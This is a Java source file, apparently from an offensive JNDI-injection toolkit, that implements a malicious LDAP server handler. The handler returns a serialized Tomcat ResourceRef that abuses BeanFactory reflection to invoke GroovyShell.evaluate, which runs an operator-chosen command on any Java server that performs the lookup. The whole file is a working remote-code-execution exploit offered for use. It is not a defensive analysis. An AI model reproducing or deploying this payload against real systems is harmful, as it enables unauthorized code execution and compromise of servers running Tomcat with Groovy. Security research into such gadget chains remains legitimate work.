package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;

import static artsploit.Utilities.getBase64CommandTpl;
import static artsploit.Utilities.serialize;

/**
 * Yields:
 *  RCE via arbitrary bean creation in {@link org.apache.naming.factory.BeanFactory}
 *  When bean is created on the server side, we can control its class name and setter methods,
 *   so we can leverage {@link groovy.lang.GroovyShell#evaluate} method to execute arbitrary Groovy script
 *
 * @see <a href="https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html">exploitation details</a>
 *
 * Requires:
 *  Tomcat and Groovy in classpath
 *
 * @author https://twitter.com/orange_8361 and https://github.com/welk1n
 */
@LdapMapping(uri = { "/o=groovy" })
public class Groovy implements LdapController {


    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        String groovyPayload;

        if (Config.groovyPayloadPath.isEmpty()) {
            groovyPayload = "'${cmd}'.execute()".replace("${cmd}", getBase64CommandTpl(Config.command));
        } else {
            groovyPayload = new String(Files.readAllBytes(Paths.get(Config.groovyPayloadPath)), StandardCharsets.UTF_8);
        }

        System.out.println("Sending LDAP ResourceRef result for " + base + " with groovy.lang.GroovyShell payload");

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        ref.add(new StringRefAddr("x", groovyPayload));

        e.addAttribute("javaSerializedData", serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
